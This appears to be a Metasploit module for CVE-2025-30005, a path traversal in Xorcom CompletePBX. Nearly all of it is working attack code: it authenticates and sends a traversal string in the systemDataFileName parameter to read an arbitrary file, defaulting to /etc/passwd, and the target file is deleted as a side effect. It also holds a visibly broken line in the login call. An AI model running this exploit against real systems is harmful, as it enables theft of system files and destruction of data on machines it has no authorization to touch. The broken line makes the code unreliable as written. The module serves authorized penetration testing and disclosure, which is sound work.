##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::XorcomCompletePbx
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Xorcom CompletePBX Arbitrary File Read and Deletion via systemDataFileName',
        'Description' => %q{
          This module exploits an authenticated path traversal vulnerability in
          Xorcom CompletePBX <= 5.2.35. The issue occurs due to improper validation of the
          `systemDataFileName` parameter in the `diagnostics` module, allowing authenticated attackers
          to retrieve arbitrary files from the system.

          Additionally, the exploitation of this vulnerability results in the **deletion** of the
          requested file from the target system.

          The vulnerability is identified as CVE-2025-30005.
        },
        'Author' => [
          'Valentin Lobstein' # Research and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-30005'],
          ['URL', 'https://xorcom.com/new-completepbx-release-5-2-36-1/'],
          ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
        ],
        'DisclosureDate' => '2025-03-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE, OS_RESOURCE_LOSS],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for authentication']),
        OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/passwd'])
      ]
    )
    register_advanced_options(
      [
        OptBool.new('DefangedMode', [ true, 'Run in defanged mode', true ])
      ]
    )
  end

  def check
    completepbx?
  end

  def run
    if datastore['DefangedMode']
      warning = <<~EOF

        Are you *SURE* you want to execute the module against the target?
        Running this module will attempt to read and delete the file
        specified by TARGETFILE on the remote system.

        If you have explicit authorisation, re-run with:
            set DefangedMode false
      EOF
      fail_with(Failure::BadConfig, warning)
    end

    print_warning('This exploit WILL delete the target file if permissions allow.')
    sleep(2)

    sid_cookie = completepbx_login(datastore['USERNAME', datastore['PASSWORD']])
    target_file = "../../../../../../../../../../../#{datastore['TARGETFILE']}"

    print_status("Attempting to read file: #{target_file}")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI']),
      'method' => 'GET',
      'headers' => { 'Cookie' => sid_cookie },
      'vars_get' => {
        'class' => 'diagnostics',
        'method' => 'stopMode',
        'systemDataFileName' => target_file
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
    end

    body = res.body.lines[0..-2].join

    if res.headers['Content-Type']&.include?('application/zip')
      print_status('ZIP file received, attempting to list files')

      files_list = list_files_in_zip(body)

      if files_list.empty?
        fail_with(Failure::NotVulnerable, 'ZIP archive received but contains no files.')
      end

      print_status("Files inside ZIP archive:\n - " + files_list.join("\n - "))

      extracted_content = read_file_from_zip(body, File.basename(target_file), files_list)

      if extracted_content
        print_good("Content of #{datastore['TARGETFILE']}:\n#{extracted_content}")
      else
        fail_with(Failure::NotVulnerable, 'File not found in ZIP archive.')
      end
    else
      print_good("Raw file content received:\n#{body}")
    end
  end

  def list_files_in_zip(zip_data)
    files = []
    begin
      ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
        while (entry = io.get_next_entry)
          files << entry.name
        end
      end
    rescue ::Zip::Error, ::IOError, ::ArgumentError => e
      fail_with(Failure::UnexpectedReply, "Invalid ZIP data: #{e.class} - #{e.message}")
    end
    files
  end

  def read_file_from_zip(zip_data, target_filename, files_list)
    possible_matches = files_list.select { |f| f.include?(target_filename) }
    return nil if possible_matches.empty?

    correct_filename = possible_matches.first
    file_content = nil

    begin
      ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
        while (entry = io.get_next_entry)
          if entry.name == correct_filename
            file_content = io.read
            break
          end
        end
      end
    rescue ::Zip::Error, ::IOError, ::ArgumentError => e
      fail_with(Failure::UnexpectedReply, "Error reading ZIP archive: #{e.class} - #{e.message}")
    end

    file_content
  end
end
